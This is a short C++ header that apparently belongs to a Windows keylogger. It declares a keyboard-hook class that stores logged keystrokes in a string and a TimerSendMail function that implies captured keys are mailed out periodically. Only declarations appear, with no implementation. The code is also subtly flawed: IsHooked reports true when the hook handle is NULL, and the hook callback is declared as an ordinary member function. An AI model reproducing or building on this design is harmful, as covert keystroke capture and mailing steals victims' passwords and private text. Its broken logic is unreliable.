#pragma once

#ifndef KEYBHOOK_H
#define KEYBHOOK_H

#include <string>
#include <windows.h>

class KeyboardManager
{

public:
	// KeyboardManager constructor
	KeyboardManager();

	// Begins logging keystrokes
	bool InstallHooks();

	// Stops logging keystrokes
	bool UninstallHooks();

	bool IsHooked() const {	return eHook == NULL; }

	std::string keylog;

private:
	// Handles key presses and releases
	LRESULT KeyboardProc(int nCode, WPARAM wparam, LPARAM lparam);

	HHOOK eHook;
};

void TimerSendMail();

#endif
